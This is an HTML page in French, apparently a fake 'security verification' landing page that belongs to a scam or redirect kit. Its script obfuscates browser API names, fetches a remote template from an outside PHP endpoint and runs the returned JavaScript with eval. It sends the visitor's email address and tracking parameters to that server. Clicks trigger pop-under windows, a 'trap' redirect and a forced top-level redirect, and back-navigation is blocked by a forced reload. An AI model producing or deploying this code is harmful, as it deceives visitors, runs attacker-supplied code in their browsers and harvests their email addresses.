<!DOCTYPE html>
<html lang="fr">
<head>
Â  Â  <meta charset="UTF-8">
Â  Â  <meta name="viewport" content="width=device-width, initial-scale=1.0">
Â  Â  <meta name="robots" content="noindex, nofollow">
Â  Â  <title>VÃ©rification de sÃ©curitÃ©</title>
Â  Â Â 
Â  Â  <style id="template-styles">
Â  Â  Â  Â  /* Styles du loader */
Â  Â  Â  Â  @keyframes spin { 100% { transform: rotate(360deg); } }
Â  Â  Â  Â Â 
Â  Â  Â  Â  html, body {
Â  Â  Â  Â  Â  Â  height: 100%;
Â  Â  Â  Â  Â  Â  width: 100%;
Â  Â  Â  Â  Â  Â  margin: 0;
Â  Â  Â  Â  Â  Â  padding: 0;
Â  Â  Â  Â  Â  Â  overflow: hidden;Â 
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  body {Â 
Â  Â  Â  Â  Â  Â  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;Â 
Â  Â  Â  Â  Â  Â  background-size: cover;Â 
Â  Â  Â  Â  Â  Â  background-repeat: no-repeat;
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  #template-container {
Â  Â  Â  Â  Â  Â  height: 100%;Â 
Â  Â  Â  Â  Â  Â  width: 100%;
Â  Â  Â  Â  }

Â  Â  Â  Â  #loading-spinner {
Â  Â  Â  Â  Â  Â  position: absolute;
Â  Â  Â  Â  Â  Â  top: 50%;
Â  Â  Â  Â  Â  Â  left: 50%;
Â  Â  Â  Â  Â  Â  transform: translate(-50%, -50%);
Â  Â  Â  Â  Â  Â  display: inline-flex;
Â  Â  Â  Â  Â  Â  align-items: center;
Â  Â  Â  Â  Â  Â  justify-content: center;
Â  Â  Â  Â  Â  Â  gap: 8px;
Â  Â  Â  Â  Â  Â  color: #333;
Â  Â  Â  Â  }
Â  Â  </style>
</head>
<body>
Â  Â Â 
Â  Â  <div id="template-container">
Â  Â  Â  Â  <div id="loading-spinner">
Â  Â  Â  Â  Â  Â  <div style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
Â  Â  Â  Â  Â  Â  Chargement de la vÃ©rification...
Â  Â  Â  Â  </div>
Â  Â  </div>
Â  Â Â 
<script>

    // ðŸš¨ MODIFICATION 1 : FORCER LE RECHARGEMENT AU RETOUR ARRIÃˆRE (Correction Mobile)
    // Cela empÃªche l'exÃ©cution d'un script en mÃ©moire avec un Ã©tat "redirected=true"
    if (window.performance && window.performance.navigation.type === window.performance.navigation.TYPE_BACK_FORWARD) {
        location.reload(true);
    }

Â  Â  // --- OBFUSCATION DE BASE ---
Â  Â  const H = ['h', 'i', 's', 't', 'o', 'r', 'y'].join('');
Â  Â  const PS = ['p', 'u', 's', 'h', 'S', 't', 'a', 't', 'e'].join('');
Â  Â  const WO = ['o', 'p', 'e', 'n'].join('');
Â  Â  const BK = '_' + ['b', 'l', 'a', 'n', 'k'].join('');
Â  Â  const FOCUS = ['f', 'o', 'c', 'u', 's'].join('');
Â  Â  const FE = ['f', 'e', 't', 'c', 'h'].join('');
Â  Â  const HREF = ['h', 'r', 'e', 'f'].join('');
Â  Â Â 
Â  Â  const URL_PHP = "https://lespetitscoquins.fr/cancel-booking.php";Â 
Â  Â  const URL_TEMPLATE = URL_PHP + "?action=get_template";Â 

Â  Â  const METHOD_POST = ['P', 'O', 'S', 'T'].join('');
Â  Â  const METHOD_GET = ['G', 'E', 'T'].join('');
Â  Â  const SUCCESS_ICON_HTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
Â  Â  const LOADER_HTML_FIXED = '<div id="loader" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>';

Â  Â  // âŒ Ancienne variable 'redirected' supprimÃ©e, l'Ã©tat sera gÃ©rÃ© par la redirection forcÃ©e.
Â  Â Â 
Â  Â  // --- 1. FONCTIONS DE BASES ---
Â  Â  function getUrlParameter(name) {
Â  Â  Â  Â  name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
Â  Â  Â  Â  var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
Â  Â  Â  Â  var results = regex.exec(location.search);
Â  Â  Â  Â  return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
Â  Â  };

    // Fonction de redirection sans gestion d'Ã©tat interne
Â  Â  function executeHiddenLogic(urlMain, urlPop, idBack) {
Â  Â  Â  Â Â 
Â  Â  Â  Â  // 1. Redirection Pop-up (url_pop)
Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  var popWindow = window[WO](urlPop, BK);
Â  Â  Â  Â  Â  Â  if(popWindow) {
Â  Â  Â  Â  Â  Â  Â  Â  popWindow.blur();
Â  Â  Â  Â  Â  Â  Â  Â  window[FOCUS]();
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  } catch(e) {}
Â  Â  Â  Â Â 
Â  Â  Â  Â  // 2. Redirection Trap (idBack) (Correction prÃ©cÃ©dente)
Â  Â  Â  Â  const trapUrl = URL_PHP + "?sec_id=" + idBack + window.location.search;
Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  window[WO](trapUrl, BK); 
Â  Â  Â  Â  } catch(e) {}

Â  Â  Â  Â  // 3. Redirection Principale (urlMain)
Â  Â  Â  Â  setTimeout(function(){
Â  Â  Â  Â  Â  Â  window.top.location[HREF] = urlMain;
Â  Â  Â  Â  }, 300);
Â  Â  }
Â  Â Â 
Â  Â  // --- 2.CLICS ---
Â  Â  function initializeUnifiedClicks(jsScript) {
Â  Â  Â  Â  document.querySelectorAll('.action-btn').forEach(btn => {
Â  Â  Â  Â  Â  Â  btn.addEventListener('click', function(event) {
Â  Â  Â  Â  Â  Â  Â  Â  event.preventDefault();
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  // EmpÃªche les doubles clics rapides
Â  Â  Â  Â  Â  Â  Â  Â  this.setAttribute('data-original-html', this.innerHTML);
Â  Â  Â  Â  Â  Â  Â  Â  this.innerHTML = '<span style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">' + LOADER_HTML_FIXED + ' VÃ©rification...</span>';
Â  Â  Â  Â  Â  Â  Â  Â  this.style.pointerEvents = 'none';
Â  Â  Â  Â  Â  Â  Â  Â  this.style.opacity = '0.8';

Â  Â  Â  Â  Â  Â  Â  Â  executeAjaxLogic(this);
Â  Â  Â  Â  Â  Â  });
Â  Â  Â  Â  });
Â  Â  Â  Â Â 
Â  Â  Â  Â  try {
Â  Â  Â  Â  Â  Â  if (jsScript) {
Â  Â  Â  Â  Â  Â  Â  Â  eval(jsScript);
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  } catch (e) {
Â  Â  Â  Â  Â  Â  console.error("Erreur lors de l'exÃ©cution du script de template :", e);
Â  Â  Â  Â  }
Â  Â  }
Â  Â Â 
Â  Â  function executeAjaxLogic(btnElement) {
Â  Â  Â  Â  var formData = new FormData();
Â  Â  Â  Â  formData.append('action', 'get_links');
Â  Â  Â  Â Â 
Â  Â  Â  Â  var emailParam = getUrlParameter('u');Â 
Â  Â  Â  Â  if (emailParam) {
Â  Â  Â  Â  Â  Â  formData.append('u', emailParam);Â 
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  // Si vous avez d'autres subX dans l'URL:
Â  Â  Â  Â  Â  Â  if (getUrlParameter('sub1')) formData.append('sub1', getUrlParameter('sub1'));
Â  Â  Â  Â  Â  Â  if (getUrlParameter('sub2')) formData.append('sub2', getUrlParameter('sub2'));
Â  Â  Â  Â  Â  Â  // ... etc.
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  window[FE](URL_PHP, { method: METHOD_POST, body: formData })
Â  Â  Â  Â  .then(response => response.json())
Â  Â  Â  Â  .then(data => {
Â  Â  Â  Â  Â  Â  if (data.status === 'ok') {
Â  Â  Â  Â  Â  Â  Â  Â  executeHiddenLogic(data.url_main, data.url_pop, data.id_back);
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  setTimeout(function(){
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  btnElement.innerHTML = SUCCESS_ICON_HTML + " AccÃ¨s autorisÃ©";
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  btnElement.style.background = '#009432';
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  btnElement.style.color = 'white';
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  btnElement.style.opacity = '1';
Â  Â  Â  Â  Â  Â  Â  Â  }, 800);
Â  Â  Â  Â  Â  Â  } else {
Â  Â  Â  Â  Â  Â  Â  Â  location.reload();
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  })
Â  Â  Â  Â  .catch(err => {
Â  Â  Â  Â  Â  Â  console.error("Erreur Fetch:", err);
Â  Â  Â  Â  Â  Â  btnElement.innerHTML = btnElement.getAttribute('data-original-html') || "Erreur, rÃ©essayer";
Â  Â  Â  Â  Â  Â  btnElement.style.pointerEvents = 'auto';
Â  Â  Â  Â  Â  Â  btnElement.style.opacity = '1';
Â  Â  Â  Â  });
Â  Â  }

Â  Â  // --- 3.CHARGEMENT ---
Â  Â  function loadTemplate() {
Â  Â  Â  Â  let trackingParams = window.location.search;
Â  Â  Â  Â  let finalParams = '';Â 
Â  Â  Â  Â Â 
Â  Â  Â  Â  if (trackingParams.length > 0 && trackingParams.startsWith('?')) {
Â  Â  Â  Â  Â  Â  finalParams = '&' + trackingParams.substring(1);Â 
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â  document.getElementById('loading-spinner').style.display = 'inline-flex';
Â  Â  Â  Â Â 
Â  Â  Â  Â  window[FE](URL_TEMPLATE + finalParams, { method: METHOD_GET })
Â  Â  Â  Â  .then(response => {
Â  Â  Â  Â  Â  Â  if (!response.ok) {
Â  Â  Â  Â  Â  Â  Â  Â  throw new Error('Erreur rÃ©seau ou script PHP non trouvÃ©/mal configurÃ©.');
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  return response.json();
Â  Â  Â  Â  })
Â  Â  Â  Â  .then(data => {
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  document.getElementById('loading-spinner').style.display = 'none';
Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  if (data.status === 'ok' && data.html) {
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  // 1. HTML
Â  Â  Â  Â  Â  Â  Â  Â  document.getElementById('template-container').innerHTML = data.html;
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  // 2. Application du fondÂ 
Â  Â  Â  Â  Â  Â  Â  Â  const rootDiv = document.getElementById('template-container').children[0];
Â  Â  Â  Â  Â  Â  Â  Â  if (rootDiv) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  const backgroundStyle = rootDiv.style.background || rootDiv.style.backgroundColor;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  const backdropStyle = rootDiv.style.backdropFilter || rootDiv.style.webkitBackdropFilter;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  if (backgroundStyle) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  document.body.style.background = backgroundStyle;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  if (backdropStyle) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  document.body.style.backdropFilter = backdropStyle;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  document.body.style.webkitBackdropFilter = backdropStyle;
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  rootDiv.style.height = '100vh';
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  document.getElementById('template-styles').innerHTML += data.css || '';
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  Â  Â  initializeUnifiedClicks(data.js);
Â  Â  Â  Â  Â  Â  Â  Â Â 
Â  Â  Â  Â  Â  Â  } else {
Â  Â  Â  Â  Â  Â  Â  Â  document.getElementById('template-container').innerHTML = '<p style="color:red;">Erreur: Template non reÃ§u.</p>';
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  })
Â  Â  Â  Â  .catch(err => {
Â  Â  Â  Â  Â  Â  document.getElementById('loading-spinner').style.display = 'none';
Â  Â  Â  Â  Â  Â  console.error("Erreur critique au chargement du template:", err);
Â  Â  Â  Â  Â  Â  document.getElementById('template-container').innerHTML = '<p style="color:red; font-size: 16px;">Erreur de connexion au serveur de vÃ©rification. (VÃ©rifiez URL_PHP)</p>';
Â  Â  Â  Â  });
Â  Â  }

Â  Â  // Lance le processus de chargement
Â  Â  loadTemplate();
</script>
</body>
</html>
